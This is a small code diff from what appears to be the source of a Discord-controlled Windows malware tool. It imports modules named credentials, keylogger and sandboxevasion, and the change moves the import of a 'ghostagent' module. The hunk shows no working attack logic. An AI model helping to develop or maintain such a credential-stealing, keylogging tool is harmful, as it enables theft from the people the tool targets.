@@ -29,8 +29,8 @@ import psutil
 import win32pdh
 from winreg import *
 from ctypes import *
-from libraries import credentials,keylogger,sandboxevasion,ghostagent
-
+from libraries import credentials,keylogger,sandboxevasion
+from Source import ghostagent
 
 GUILD = discord.Object(id = "{GUILD}")
 CHANNEL = {CHANNEL}
